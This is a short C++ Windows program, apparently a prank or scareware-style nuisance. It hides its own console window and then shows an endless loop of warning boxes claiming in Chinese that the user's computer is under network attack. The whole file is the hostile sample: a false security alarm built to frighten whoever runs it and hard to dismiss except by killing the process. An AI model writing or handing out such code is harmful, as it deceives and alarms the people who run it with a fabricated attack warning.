#include<bits/stdc++.h> 
#include<windows.h>
using namespace std;
int main(){
	HWND h;
	h=FindWindow("ConsoleWindowClass",NULL);
	if(h) ShowWindow(h,SW_HIDE);
	while(2>1){
		MessageBox(NULL,"你的电脑受到网络攻击","Warning",MB_OK|MB_ICONEXCLAMATION);
	}
	return 0;
}
